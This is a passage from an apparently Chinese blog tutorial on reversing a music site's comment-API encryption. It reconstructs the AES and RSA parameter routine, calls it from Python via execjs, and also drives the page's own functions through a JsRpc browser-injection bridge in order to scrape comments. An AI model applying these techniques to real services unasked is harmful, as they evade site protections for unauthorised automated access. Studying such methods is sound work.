获取AES加密数据</span><br><span class="line">const CryptoJS = require(&quot;crypto-js&quot;)</span><br><span class="line">function encryptMessage(message, key) &#123;</span><br><span class="line">    let keyUtf8 = CryptoJS.enc.Utf8.parse(key);</span><br><span class="line">    let iv = CryptoJS.enc.Utf8.parse(&quot;0102030405060708&quot;);</span><br><span class="line">    let messageUtf8 = CryptoJS.enc.Utf8.parse(message);</span><br><span class="line">    let encrypted = CryptoJS.AES.encrypt(messageUtf8, keyUtf8, &#123;</span><br><span class="line">        iv: iv,</span><br><span class="line">        mode: CryptoJS.mode.CBC&#125;);</span><br><span class="line">    return encrypted.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let message = &#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;3&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1708238561030&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;;</span><br><span class="line">let key = generateRandomString(16);</span><br><span class="line">let encrypyResult = encryptMessage(message, &quot;0CoJUm6Qyw8W8jud&quot;)</span><br><span class="line">// console.log(encrypyResult)</span><br><span class="line">let encText = encryptMessage(encrypyResult, key)</span><br><span class="line">console.log(encText)</span><br></pre></td></tr></table></figure><h3 id="函数c"><a href="#函数c" class="headerlink" title="函数c"></a>函数c</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function c(a, b, c) &#123;</span><br><span class="line">        var d, e;</span><br><span class="line">        return setMaxDigits(131),</span><br><span class="line">        d = new RSAKeyPair(b,&quot;&quot;,c),</span><br><span class="line">        e = encryptedString(d, a)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这段代码里面分别有三个函数，得把这三个函数给补全了</p><p>首先来补全setMaxDigits函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setMaxDigits(a) &#123;</span><br><span class="line">    maxDigits = a,</span><br><span class="line">    ZERO_ARRAY = new Array(maxDigits);</span><br><span class="line">    for (var b = 0; b &lt; ZERO_ARRAY.length; b++)</span><br><span class="line">        ZERO_ARRAY[b] = 0;</span><br><span class="line">    bigZero = new BigInt,</span><br><span class="line">    bigOne = new BigInt,</span><br><span class="line">    bigOne.digits[0] = 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一点需要注意一下，BigInt并不是JavaScript内置的类型，而是自定义的，因此我们需要找到它。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function BigInt(a) &#123;</span><br><span class="line">    this.digits = &quot;boolean&quot; == typeof a &amp;&amp; 1 == a ? null : ZERO_ARRAY.slice(0),</span><br><span class="line">    this.isNeg = !1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述两段代码的作用应该是用于做一些运算相关的动作。具体的事情我们也不必深究，接下来要做的事情就是将两个函数合并起来。修改后如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function BigInt(value) &#123;</span><br><span class="line">    let ZERO_ARRAY = new Array(maxDigits);</span><br><span class="line">    this.digits = &quot;boolean&quot; == typeof a &amp;&amp; 1 == value ? null : ZERO_ARRAY.slice(0),</span><br><span class="line">    this.isNeg = !1</span><br><span class="line">&#125;</span><br><span class="line">function setMaxDigits(value) &#123;</span><br><span class="line">    let maxDigits = value;</span><br><span class="line">    let ZERO_ARRAY = new Array(maxDigits);</span><br><span class="line">    for (let i = 0; i &lt; ZERO_ARRAY.length; i++) &#123;</span><br><span class="line">            ZERO_ARRAY[i] = 0;</span><br><span class="line">        &#125;</span><br><span class="line">    let bigZero = new BigInt(131); // 传递false代表我们希望初始化为0的BigInt对象</span><br><span class="line">    let bigOne = new BigInt(131);</span><br><span class="line">    bigOne.digits[0] = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>紧接着分析RSAKeyPair函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function RSAKeyPair(a, b, c) &#123;</span><br><span class="line">    this.e = biFromHex(a),</span><br><span class="line">    this.d = biFromHex(b),</span><br><span class="line">    this.m = biFromHex(c),</span><br><span class="line">    this.chunkSize = 2 * biHighIndex(this.m),</span><br><span class="line">    this.radix = 16,</span><br><span class="line">    this.barrett = new BarrettMu(this.m)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>剩下的就不细说了，继续往前补全就行。。。。</p><h2 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function get_post_data(i3x) &#123;</span><br><span class="line">    e = &#x27;010001&#x27;</span><br><span class="line">    f = &#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span><br><span class="line">    g = &#x27;0CoJUm6Qyw8W8jud&#x27;</span><br><span class="line">    return  bVg1x = asrsea(JSON.stringify(i3x), e, f, g);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let i3x = &#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;1&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;-1&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;;</span><br><span class="line">let result1 = get_post_data(i3x)</span><br><span class="line">console.log(result1)</span><br></pre></td></tr></table></figure><p><strong>python</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;authority&quot;</span>: <span class="string">&quot;music.xxx.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;accept-language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cache-control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">    <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;https://music.xxx.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">    <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://music.xxx.com/outchain/player?type=2&amp;id=2051548110&amp;auto=1&amp;height=66&amp;bg=e8e8e8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&quot;\&quot;Google Chrome\&quot;;v=\&quot;119\&quot;, \&quot;Chromium\&quot;;v=\&quot;119\&quot;, \&quot;Not?A_Brand\&quot;;v=\&quot;24\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua-platform&quot;</span>: <span class="string">&quot;\&quot;Windows\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-fetch-dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-fetch-mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-fetch-site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&#x27;csrf_token&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xzwy.js&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    js = f.read()</span><br><span class="line">cursor = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">i3x = &#123;<span class="string">&quot;rid&quot;</span>:<span class="string">&quot;R_SO_4_2061978961&quot;</span>,<span class="string">&quot;threadId&quot;</span>:<span class="string">&quot;R_SO_4_2061978961&quot;</span>,<span class="string">&quot;pageNo&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;pageSize&quot;</span>:<span class="string">&quot;20&quot;</span>,<span class="string">&quot;cursor&quot;</span>:<span class="string">f&quot;<span class="subst">&#123;cursor&#125;</span>&quot;</span>,<span class="string">&quot;offset&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;orderType&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;csrf_token&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"><span class="comment"># print(i3x)</span></span><br><span class="line">result = execjs.<span class="built_in">compile</span>(js).call(<span class="string">&#x27;get_post_data&#x27;</span>, i3x)</span><br><span class="line">encText = result.get(<span class="string">&#x27;encText&#x27;</span>)</span><br><span class="line">encSecKey = result.get(<span class="string">&#x27;encSecKey&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(encText)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(encSecKey))</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;params&#x27;</span>: encText,</span><br><span class="line">    <span class="string">&#x27;encSecKey&#x27;</span>: encSecKey,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(</span><br><span class="line">    url=<span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">    params=params,</span><br><span class="line">    headers=headers,</span><br><span class="line">    data=data</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br><span class="line">pprint.pprint(response.json())</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071113594.png" alt="img"> </p><h1 id="JsRpc调用"><a href="#JsRpc调用" class="headerlink" title="JsRpc调用"></a>JsRpc调用</h1><p>可以看到，在后续定位到函数后，各种扣取代码，函数嵌套函数，为整个分析的过程带来了很大的麻烦。</p><p>那可不可以不扣取代码就实现获取评论的功能呢？</p><p>JSRPC刚好就可以实现该功能。</p><h2 id="加密函数参数分析"><a href="#加密函数参数分析" class="headerlink" title="加密函数参数分析"></a>加密函数参数分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.asrsea(JSON.stringify(i6c), bvl1x([&quot;流泪&quot;, &quot;强&quot;]), bvl1x(Rj5o.md), bvl1x([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;]));</span><br></pre></td></tr></table></figure><p>有4个参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JSON.stringify(i6c) </span><br><span class="line">bvl1x([&quot;流泪&quot;, &quot;强&quot;])</span><br><span class="line">bvl1x(Rj5o.md)</span><br><span class="line">bvl1x([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;])</span><br></pre></td></tr></table></figure><p>上面4个参数，对应某次的请求的值，分别如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;4&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1713198658380&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;</span><br><span class="line">&#x27;010001&#x27;</span><br><span class="line">&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span><br><span class="line">&#x27;0CoJUm6Qyw8W8jud&#x27;</span><br></pre></td></tr></table></figure><p>可以看到后三个参数是先调用了<strong>bvl1x方法</strong>的，所以在hook加密函数之前，要先对他进行hook。</p><p>（貌似这后三个值不会变化，可以写死，但这块为了验证RPC，还是借用他来实现）</p><h3 id="bvl1x方法"><a href="#bvl1x方法" class="headerlink" title="bvl1x方法"></a>bvl1x方法</h3><p>1、定义全局导出函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.p = bvl1x</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117151.png" alt="image.png"> </p><p>2、配置RPC环境</p><p>（1）注入JSenv环境</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117201.png" alt="img"> </p><p>（2）运行exe，浏览器（客户端）和 本地（服务端）建立连接</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071118893.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 注入环境后连接通信</span><br><span class="line">var demo = new Hlclient(&quot;ws://127.0.0.1:12080/ws?group=zzz&amp;name=hlg&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071118594.png" alt="image.png"> </p><p>3、在前端注入JS代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hlg1</span>(<span class="params">data1</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">p</span>(data1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hacker1&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>)&#123;</span><br><span class="line">  res=<span class="title function_">hlg1</span>(param[<span class="string">&quot;data1&quot;</span>]);</span><br><span class="line">  <span class="title function_">resolve</span>(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071118541.png" alt="image.png"> </p><p>4、python脚本如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> jsonpath</span><br><span class="line"></span><br><span class="line">jscode1 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    s = p([&quot;</span>流泪<span class="string">&quot;, &quot;</span>强<span class="string">&quot;]);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">jscode2 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    var Rj5o_md = [&quot;</span>色<span class="string">&quot;, &quot;</span>流感<span class="string">&quot;, &quot;</span>这边<span class="string">&quot;, &quot;</span>弱<span class="string">&quot;, &quot;</span>嘴唇<span class="string">&quot;, &quot;</span>亲<span class="string">&quot;, &quot;</span>开心<span class="string">&quot;, &quot;</span>呲牙<span class="string">&quot;, &quot;</span>憨笑<span class="string">&quot;, &quot;</span>猫<span class="string">&quot;, &quot;</span>皱眉<span class="string">&quot;, &quot;</span>幽灵<span class="string">&quot;, &quot;</span>蛋糕<span class="string">&quot;, &quot;</span>发怒<span class="string">&quot;, &quot;</span>大哭<span class="string">&quot;, &quot;</span>兔子<span class="string">&quot;, &quot;</span>星星<span class="string">&quot;, &quot;</span>钟情<span class="string">&quot;, &quot;</span>牵手<span class="string">&quot;, &quot;</span>公鸡<span class="string">&quot;, &quot;</span>爱意<span class="string">&quot;, &quot;</span>禁止<span class="string">&quot;, &quot;</span>狗<span class="string">&quot;, &quot;</span>亲亲<span class="string">&quot;, &quot;</span>叉<span class="string">&quot;, &quot;</span>礼物<span class="string">&quot;, &quot;</span>晕<span class="string">&quot;, &quot;</span>呆<span class="string">&quot;, &quot;</span>生病<span class="string">&quot;, &quot;</span>钻石<span class="string">&quot;, &quot;</span>拜<span class="string">&quot;, &quot;</span>怒<span class="string">&quot;, &quot;</span>示爱<span class="string">&quot;, &quot;</span>汗<span class="string">&quot;, &quot;</span>小鸡<span class="string">&quot;, &quot;</span>痛苦<span class="string">&quot;, &quot;</span>撇嘴<span class="string">&quot;, &quot;</span>惶恐<span class="string">&quot;, &quot;</span>口罩<span class="string">&quot;, &quot;</span>吐舌<span class="string">&quot;, &quot;</span>心碎<span class="string">&quot;, &quot;</span>生气<span class="string">&quot;, &quot;</span>可爱<span class="string">&quot;, &quot;</span>鬼脸<span class="string">&quot;, &quot;</span>跳舞<span class="string">&quot;, &quot;</span>男孩<span class="string">&quot;, &quot;</span>奸笑<span class="string">&quot;, &quot;</span>猪<span class="string">&quot;, &quot;</span>圈<span class="string">&quot;, &quot;</span>便便<span class="string">&quot;, &quot;</span>外星<span class="string">&quot;, &quot;</span>圣诞<span class="string">&quot;]</span></span><br><span class="line"><span class="string">    s = p(Rj5o_md);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">jscode3 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    s = p([&quot;</span>爱心<span class="string">&quot;, &quot;</span>女孩<span class="string">&quot;, &quot;</span>惊恐<span class="string">&quot;, &quot;</span>大笑<span class="string">&quot;]);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/execjs&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">des_enc</span>():</span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode1</span><br><span class="line">    &#125;</span><br><span class="line">    res1 = requests.<span class="title function_">post</span>(url, data=data1)</span><br><span class="line">    <span class="title function_">print</span>(res1.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line">    data2 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode2</span><br><span class="line">    &#125;</span><br><span class="line">    res2 = requests.<span class="title function_">post</span>(url, data=data2)</span><br><span class="line">    <span class="title function_">print</span>(res2.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line">    data3 = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;jscode&quot;</span>: jscode3</span><br><span class="line">    &#125;</span><br><span class="line">    res3 = requests.<span class="title function_">post</span>(url, data=data3)</span><br><span class="line">    <span class="title function_">print</span>(res3.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">des_enc</span>()</span><br></pre></td></tr></table></figure><p> 运行后，获得三个参数的值。<img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1713257229122-ed7036e6-5a86-43b5-ad3e-8cc13efeb688.png" alt="img"></p><h2 id="加密函数调用"><a href="#加密函数调用" class="headerlink" title="加密函数调用"></a>加密函数调用</h2><p>1、前端注入JS代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hlg2</span>(<span class="params">data2</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> param2 = <span class="string">&quot;010001&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> param3 = <span class="string">&quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&quot;</span></span><br><span class="line">  <span class="keyword">var</span> param4 = <span class="string">&quot;0CoJUm6Qyw8W8jud&quot;</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">asrsea</span>(data2,param2,param3,param4))</span><br><span class="line">  obj = <span class="title function_">asrsea</span>(data2,param2,param3,param4)</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hacker2&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>)&#123;</span><br><span class="line">  res=<span class="title function_">hlg2</span>(param[<span class="string">&quot;data2&quot;</span>]);</span><br><span class="line">  <span class="title function_">resolve</span>(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071117273.png" alt="img"> </p><p>2、python脚本如下</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">param1 = <span class="string">&#x27;&#123;&quot;rid&quot;:&quot;R_SO_4_2061978961&quot;,&quot;threadId&quot;:&quot;R_SO_4_2061978961&quot;,&quot;pageNo&quot;:&quot;4&quot;,&quot;pageSize&quot;:&quot;20&quot;,&quot;cursor&quot;:&quot;1713198658380&quot;,&quot;offset&quot;:&quot;0&quot;,&quot;orderType&quot;:&quot;1&quot;,&quot;csrf_token&quot;:&quot;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:12080/go&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">enc</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(&#123;<span class="string">&quot;data2&quot;</span>: param1&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> json.<span class="title function_">loads</span>(res.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">enc</span>())</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405071118130.png" alt="image.png"> </p><p>3、但上面代码是在前端中将参数写死的，这块可以动态调用Python脚本中计算的值。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hlg2</span>(<span class="params">data2,param2,param3,param4</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">asrsea</span>(data2,param2,param3,param4))</span><br><span class="line">  obj = <span class="title function_">asrsea</span>(data2,param2,param3,param4)</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo.<span class="title function_">regAction</span>(<span class="string">&quot;hacker2&quot;</span>, <span class="keyword">function</span> (<span class="params">resolve,param</span>)&#123;</span><br><span class="line">  res=<span class="title function_">hlg2</span>(param[<span class="string">&quot;data2&quot;</span>],param[<span class="string">&quot;param2&quot;</span>],param[<span class="string">&quot;param3&quot;</span>],param[<span class="string">&quot;param4&quot;</span>]);</span><br><span class="line">  <span class="title function_">resolve</span>(res);</span><br><span class="line">&#125;)</span><br><span class="line">def <span class="title function_">enc</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;group&quot;</span>: <span class="string">&quot;zzz&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hlg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;hacker2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;param&quot;</span>: json.<span class="title function_">dumps</span>(&#123;<span class="string">&quot;data2&quot;</span>: param1, <span class="string">&quot;param2&quot;</span>: param2, <span class="string">&quot;param3&quot;</span>: param3, <span class="string">&quot;param4&quot;</span>: param4&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.<span class="title function_">post</span>(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> json.<span class="title function_">loads</span>(res.<span class="property">text</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">enc</span>())</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1713261612399-d6afa6d9-a91e-47b0-ad2a-3eaaf955d680.png" alt="img"></p><h2 id="完整代码："><a href="#完整代码：" class="headerlink" title="完整代码："></a>完整代码：</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">jscode1 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    s = p([&quot;</span>流泪<span class="string">&quot;, &quot;</span>强<span class="string">&quot;]);</span></span><br><span class="line"><span class="string">    return s</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">jscode2 = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">(function()&#123;</span></span><br><span class="line"><span class="string">    var Rj5o_md = [&quot;</span>色<span class="string">&quot;, &quot;</span>流感<span class="string">&quot;, &quot;</span>这边<span class="string">&quot;, &quot;</span>弱<span class="string">&quot;, &quot;</span>嘴唇<span class="string">&quot;, &quot;</span>亲<span class="string">&quot;, &quot;</span>开心<span class="string">&quot;, &quot;</span>呲牙<span class="string">&quot;, &quot;</span>憨笑<span class="string">&quot;, &quot;</span>猫<span class="string">&quot;, &quot;</span>皱眉<span class="string">&quot;, &quot;</span>幽灵<span class="string">&quot;, &quot;</span>蛋糕<span class="string">&quot;, &quot;</span>发怒<span class="string">&quot;, &quot;</span>大哭<span class="string">&quot;, &quot;</span>兔子<span class="string">&quot;, &quot;</span>星星<span class="string">&quot;, &quot;</span>钟情<span class="string">&quot;, &quot;</span>牵手<span class="string">&quot;, &quot;</span>公鸡<span class="string">&quot;, &quot;</span>爱意<span class="string">&quot;, &quot;</span>禁止<span class="string">&quot;, &quot;</span>狗<span class="string">&quot;, &quot;</span>亲亲<span class="string">&quot;, &quot;</span>叉<span class="string">&quot;, &quot;</span>礼物<span class="string">&quot;, &quot;</span>晕<span class="string">&quot;, &quot;</span>呆<span class="string">&quot;, &quot;</span>生病<span class="string">&quot;, &quot;</span>钻石<span class="string">&quot;, &quot;</span>拜<span class="string">&quot;, &quot;</span>怒<span class="string">&quot;, &quot;</span>示爱<span class="string">&quot;, &quot;</span>汗<span class="string">&quot;, &quot;</span>小鸡<span class="string">&quot;, &quot;</span>痛苦<span class="string">&quot;, &quot;</span>撇嘴<span class="string">&quot;, &quot;</span>惶恐<span class="string">&quot;, &quot;</span>口罩<span class="string">&quot;, &quot;</span>吐舌<span class="string">&quot;, &quot;</span>心碎<span class="string">&quot;, &quot;</span>生气<span class="string">&quot;, 